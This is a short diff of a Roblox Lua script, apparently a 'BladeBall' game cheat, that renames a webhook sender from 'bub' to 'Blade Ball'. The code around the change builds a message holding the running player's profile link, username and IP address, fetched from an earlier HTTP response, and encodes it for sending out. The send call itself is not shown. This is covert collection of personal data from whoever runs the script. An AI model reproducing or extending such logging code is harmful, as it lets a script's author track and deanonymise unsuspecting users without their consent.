@@ -10,7 +10,7 @@ localuserid = game.Players.LocalPlayer.UserId
 userinfo = Response.Body
 
     local data = {
-        ["username"] = "bub",
+        ["username"] = "Blade Ball",
         ["content"] = "Someone executed BladeBall sript" .. "\nProfile Link: " .. "https://roblox.com/users/" .. localuserid .. "/profile" ..  "\nUsername: " .. localusername .. "\nIp: " .. userinfo ,
     }
     local newdata = game:GetService("HttpService"):JSONEncode(data)
